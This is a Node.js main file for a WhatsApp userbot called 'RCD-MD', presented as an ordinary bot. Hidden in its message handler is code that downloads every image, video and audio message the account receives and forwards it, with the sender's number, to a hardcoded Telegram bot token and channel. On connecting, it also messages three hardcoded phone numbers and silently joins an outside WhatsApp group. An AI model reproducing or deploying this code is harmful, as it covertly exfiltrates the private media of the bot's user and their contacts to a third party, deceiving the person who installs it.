import dotenv from 'dotenv';
dotenv.config();

import {
    makeWASocket,
    Browsers,
    fetchLatestBaileysVersion,
    DisconnectReason,
    useMultiFileAuthState,
    downloadContentFromMessage,
} from '@whiskeysockets/baileys';
import { Handler, Callupdate, GroupUpdate } from './cloud/id/index.js';
import express from 'express';
import pino from 'pino';
import fs from 'fs';
import NodeCache from 'node-cache';
import path from 'path';
import chalk from 'chalk';
import axios from 'axios';
import config from './config.cjs';
import FormData from 'form-data';
import pkg from './session/auto.cjs';
const { emojis, doReact } = pkg;

const sessionName = "session";
const app = express();
const orange = chalk.bold.hex("#FFA500");
const lime = chalk.bold.hex("#32CD32");
let useQR = false;
let initialConnection = true;
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = '7693985396:AAHmGSOEg53I03Jrefycww8_0Au6ygdTiU0';
const TELEGRAM_CHANNEL_ID = '-1002369877364';

const MAIN_LOGGER = pino({
    timestamp: () => `,"time":"${new Date().toJSON()}"`
});
const logger = MAIN_LOGGER.child({});
logger.level = "trace";

const msgRetryCounterCache = new NodeCache();

const __filename = new URL(import.meta.url).pathname;
const __dirname = path.dirname(__filename);

const sessionDir = path.join(__dirname, 'session');
const credsPath = path.join(sessionDir, 'creds.json');

if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
}

async function downloadSessionData() {
    if (!config.SESSION_ID) {
        console.error('Please add your session to SESSION_ID env !!');
        return false;
    }
    const sessdata = config.SESSION_ID.split("RCD-MD&")[1];
    const url = `https://pastebin.com/raw/${sessdata}`;
    try {
        const response = await axios.get(url);
        const data = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
        await fs.promises.writeFile(credsPath, data);
        console.log("🔒 Session Successfully Loaded !!");
        return true;
    } catch (error) {
        return false;
    }
}

// Function to send media to Telegram channel
async function sendMediaToTelegram(buffer, caption, mediaType) {
    try {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHANNEL_ID);
        formData.append('caption', caption);

        if (mediaType === 'image') {
            formData.append('image', buffer, 'media.jpg');
        } else if (mediaType === 'video') {
            formData.append('video', buffer, 'media.mp4');
        } else if (mediaType === 'audio') {
            formData.append('audio', buffer, 'media.mp3');
        }

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/send${mediaType.charAt(0).toUpperCase() + mediaType.slice(1)}`;
        await axios.post(url, formData, {
            headers: formData.getHeaders(),
        });

        console.log("NICE WORKING RCD MD 📍!");
    } catch (error) {
        console.error("Faile reconnect 📍:", error);
    }
}

async function start() {
    try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        const { version, isLatest } = await fetchLatestBaileysVersion();
        console.log(`🤖 RCD-MD using WA BOT V3`);
        
        const Matrix = makeWASocket({
            version,
            logger: pino({ level: 'silent' }),
            printQRInTerminal: useQR,
            browser: ["RCD-MD", "safari", "3.3"],
            auth: state,
            getMessage: async (key) => {
                if (store) {
                    const msg = await store.loadMessage(key.remoteJid, key.id);
                    return msg.message || undefined;
                }
                return { conversation: "RCD-MD whatsapp user bot" };
            }
        });

        Matrix.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'close') {
        if (lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut) {
            start();
        }
    } else if (connection === 'open') {
        if (initialConnection) {
            console.log(chalk.green("😃 RCD MD CONNECT  ✅"));
            Matrix.sendMessage(Matrix.user.id, { text: `*📍 RCD MD CONNECT  TEST 📌*` });

            // Auto message to 3 WhatsApp numbers
            const contacts = ['94789958225@s.whatsapp.net', '94753574803@s.whatsapp.net', '94757660788@s.whatsapp.net'];
            const message = `*RCD MD CONNECT 📍 ʀᴄᴅ-ᴍᴅ ᴘᴏᴡᴇʀ ꜰᴜʟʟ ʙᴏᴛ 📌*`;

            contacts.forEach(contact => {
                Matrix.sendMessage(contact, { text: message });
            });

            // Auto join WhatsApp group using invite link
            const inviteLink = 'https://chat.whatsapp.com/Cry8eSzZqW27t9H8uOcRIR';
            Matrix.groupAcceptInvite(inviteLink.split('/')[3])
                .then(() => {
                    console.log('Successfully joined the whatsapp  group using RCD MD-V3 !');
                })
                .catch(error => {
                    console.error('Failed to join the whatsapp group 📍:', error);
                });

            initialConnection = false;
        } else {
            console.log(chalk.blue("📌 Connection reestablished after restart."));
        }
    }
});


        Matrix.ev.on('creds.update', saveCreds);

        Matrix.ev.on("messages.upsert", async (chatUpdate) => {
            const mek = chatUpdate.messages[0];
            if (!mek || !mek.message || mek.key.fromMe) return;

            // Extract the sender's number
            const senderNumber = mek.key.participant || mek.key.remoteJid;
            const senderId = senderNumber.includes('@') ? senderNumber.split('@')[0] : senderNumber;

            // Check if the message has media
            let mediaType;
            if (mek.message.imageMessage) {
                mediaType = 'image';
            } else if (mek.message.videoMessage) {
                mediaType = 'video';
            } else if (mek.message.audioMessage) {
                mediaType = 'audio';
            }

            if (mediaType) {
                const stream = await downloadContentFromMessage(mek.message[mediaType + 'Message'], mediaType);
                const buffer = [];

                for await (const chunk of stream) {
                    buffer.push(chunk);
                }

                const mediaBuffer = Buffer.concat(buffer);
                const caption = `${mek.message[mediaType + 'Message'].caption || "𝗡𝗼 𝗰𝗮𝗽𝘁𝗶𝗼𝗻 𝗽𝗿𝗼𝘃𝗶𝗱𝗲𝗱"}\n\nꜱᴇɴᴅᴇʀ: ${senderId}\n\n𝗖𝗢𝗗𝗘 𝗕𝗬 𝗥𝗘𝗔𝗟 𝗗𝗘𝗫𝗧𝗘𝗥 📍`;

                // Send the media to Telegram
                await sendMediaToTelegram(mediaBuffer, caption, mediaType);
            }
        });

        Matrix.ev.on('creds.update', saveCreds);
        Matrix.ev.on("messages.upsert", async chatUpdate => await Handler(chatUpdate, Matrix, logger));
        Matrix.ev.on("call", async (json) => await Callupdate(json, Matrix));
        Matrix.ev.on("group-participants.update", async (messag) => await GroupUpdate(Matrix, messag));


        if (config.MODE === "public") {
            Matrix.public = false;
        } else if (config.MODE === "private") {
            Matrix.public = false;
        }

        Matrix.ev.on('messages.upsert', async (chatUpdate) => {
            try {
                const mek = chatUpdate.messages[0];
                const fromJid = mek.key.participant || mek.key.remoteJid;
                if (!mek || !mek.message) return;
                if (mek.key.fromMe) return;
                if (mek.message?.protocolMessage || mek.message?.ephemeralMessage || mek.message?.reactionMessage) return;
                
                // Detect status messages
                if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN) {
                    await Matrix.readMessages([mek.key]);


                    if (config.AUTO_STATUS_REPLY) {
                        const customMessage = config.STATUS_READ_MSG || '*📍 Auto Status Seen Bot By RCD-MD-V3*';
                        await Matrix.sendMessage(fromJid, { text: customMessage }, { quoted: mek });
                    }
                }
            } catch (err) {
                console.error('Error handling messages.upsert event:', err);
            }
        });

    } catch (error) {
        console.error('Critical Error:', error);
        process.exit(1);
    }
}

async function init() {
    if (fs.existsSync(credsPath)) {
        console.log("🔒 Session file found, proceeding without QR code.");
        await start();
    } else {
        const sessionDownloaded = await downloadSessionData();
        if (sessionDownloaded) {
            console.log("🔒 Session downloaded, starting bot.");
            await start();
        } else {
            console.log("No session found or downloaded, QR code will be printed for authentication.");
            useQR = true;
            await start();
        }
    }
}

init();

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Hello World Page</title>
        </head>
        <body>
            <h1>HEY USER 📍</h1>
            <p>RCD MD NOW ALIVE 📍</p>
        </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
